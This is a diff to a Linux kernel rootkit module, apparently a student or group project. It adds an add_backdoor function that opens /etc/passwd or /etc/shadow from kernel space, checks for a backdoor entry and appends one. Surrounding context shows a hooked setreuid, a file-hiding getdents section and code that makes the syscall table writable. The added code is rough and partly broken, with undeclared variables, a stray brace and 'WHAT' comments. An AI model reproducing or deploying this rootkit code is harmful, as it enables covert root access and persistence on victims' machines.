@@ -41,6 +41,110 @@ asmlinkage int our_setreuid(uid_t ruid, uid_t euid){
 	return old_setreuid(ruid, euid);
 }
 
+// Start Marc STILL WORKING ON IT, IDK WHAT THIS ISSSSS
+	void add_backdoor(char *path) {
+		struct file *file;
+		char *BACKDOOR;
+		// mm_segment_t old_fs;
+		
+		char *buffer;
+		bool has_backdoor = false;
+		int page_count = 0;
+		
+		loff_t offset; // WHAT
+		
+		unsigned long ret;
+		
+		if (strcmp(path, PASSWD_FILE) == 0) 
+			{BACKDOOR = BACKDOOR_PASSWD;}
+		if (strcmp(path, SHADOW_FILE) == 0)
+			{BACKDOOR = BACKDOOR_SHADOW;}
+		
+		old_fs = get_fs(); // WHAT
+		
+		set_fs(get_ds()); // WHAT
+	    	file = filp_open(path, O_RDWR, 0); // WHAT
+	    	set_fs(old_fs); // WHAT
+
+	    	if(IS_ERR(file)){
+			goto exit;
+	    	}
+
+	    	//check if backdoor is already inserted
+	    	buf = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
+
+	    	if(!buf){
+			goto cleanup1;
+	    	}
+
+	    	has_backdoor = false;
+	    	ret = PAGE_SIZE;
+	    	offset = 0;
+	    	while(ret == PAGE_SIZE){
+			offset = page_count*PAGE_SIZE;
+
+			set_fs(get_ds());
+			ret = vfs_read(file, buf, PAGE_SIZE, &offset);
+			set_fs(old_fs);
+
+			if(ret < 0){
+		    		//DEBUG("read errors");
+		    		goto cleanup2;
+			}
+
+			page_count++;
+
+			if(strstr(buf, BACKDOOR)){
+			    has_backdoor = true;
+			    break;
+			}
+	    	}
+
+	    	if(has_backdoor){
+			//DEBUG(pathname);
+			//DEBUG("-----already has backdoor-------");
+			goto cleanup2;
+		    }
+	
+		 //DEBUG(pathname);
+	    	//DEBUG("--- doesn't have backdoor. inserting---");
+
+	    	//seek offset to end of file
+	    	offset = 0;
+
+	    	set_fs(get_ds());
+	    	offset = vfs_llseek(file, offset, SEEK_END);
+	    	set_fs(old_fs);
+
+	    	if(offset < 0){
+			goto cleanup2;
+		    }
+
+		    //add backdoor to the end of file
+		    ret = 0;
+	
+		    set_fs(get_ds()); //
+		    ret = vfs_write(file, BACKDOOR, strlen(BACKDOOR),&offset); //
+		    set_fs(old_fs); //
+	
+		    if(ret<0){
+			goto cleanup2;
+	    	}
+
+		cleanup2:
+		    if(buf)
+			kfree(buf);
+	
+		cleanup1:
+		    if(file)
+			filp_close(file, NULL);
+	
+		exit:
+		    return;
+		}
+}
+// End Marc
+
 // START BRIAN - Hide files & directories from showing up when a user does "ls"
 
 // taken from man getdents(2)
@@ -110,7 +214,12 @@ static int __init rootkit_init(void){
 	if (sys_call_address == NULL) {
     	printk(KERN_ERR "Couldn't look up sys_call_table\n");
     	return -1;
-  	}	
+  	}
+	
+	// Start Marc
+	
+	// End Marc
+	
 	printk(KERN_INFO "sys_call_table Address is: %X\n", *sys_call_address);
 	write_cr0(read_cr0() & (~0x10000)); // This will make the sys call table writable
 
